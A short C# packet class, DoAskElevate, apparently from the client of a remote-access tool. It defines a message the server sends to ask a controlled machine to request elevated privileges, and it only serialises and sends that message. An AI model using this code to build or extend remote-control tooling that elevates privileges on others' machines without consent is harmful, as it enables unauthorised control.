using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoAskElevate : IPacket
    {
        public DoAskElevate()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
